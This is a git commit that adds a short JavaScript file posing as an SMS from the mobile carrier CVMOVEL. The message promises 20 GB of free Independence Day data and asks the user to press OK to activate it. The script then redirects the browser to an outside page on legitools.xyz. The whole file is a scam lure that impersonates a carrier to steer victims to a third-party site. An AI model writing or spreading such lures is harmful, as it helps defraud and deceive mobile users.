81bc0fd28baf294b426e2cc8c990b87ad4047deb
katemj25 <mbokofficial1@gmail.com>
2025-07-04 23:29:23 -0700

    Create 20gb-cvmovel-data.js

---
+++ 20gb-cvmovel-data.js
@@ -0,0 +1,5 @@
+var password = '20 GB de dados grátis'
+password=prompt('SMS: Parabéns! Seu número é elegível para receber 20 GB de dados grátis da RECOMPENSA DO DIA DA INDEPENDÊNCIA CVMOVEL. Pressione OK para ATIVAR.. ','20 GB de dados grátis');
+if (password != '20 GB de dados grátis') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
